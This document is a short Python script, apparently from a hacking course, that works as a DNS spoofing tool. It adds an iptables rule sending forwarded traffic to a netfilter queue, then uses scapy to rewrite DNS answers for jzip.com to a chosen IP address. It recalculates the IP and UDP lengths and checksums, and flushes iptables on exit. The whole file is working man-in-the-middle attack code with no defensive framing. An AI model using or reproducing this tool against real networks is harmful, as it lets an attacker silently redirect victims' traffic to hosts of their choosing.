#!/usr/bin/env python

# Import Modules
import netfilterqueue
import scapy.all as scapy
import subprocess


# Function to convert packets that were captured in the queue to a scapy packet for analysis and spoof any DNS replies for jzip.com with Google's IP address
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "jzip.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="8.8.8.8")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()


# Create queue
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)

# Bind queue to a Python object
try:
    queue = netfilterqueue.NetfilterQueue()
    # 1st parameter is ID of the queue, 2nd parameter is a callback function that is called for each packet in the queue
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
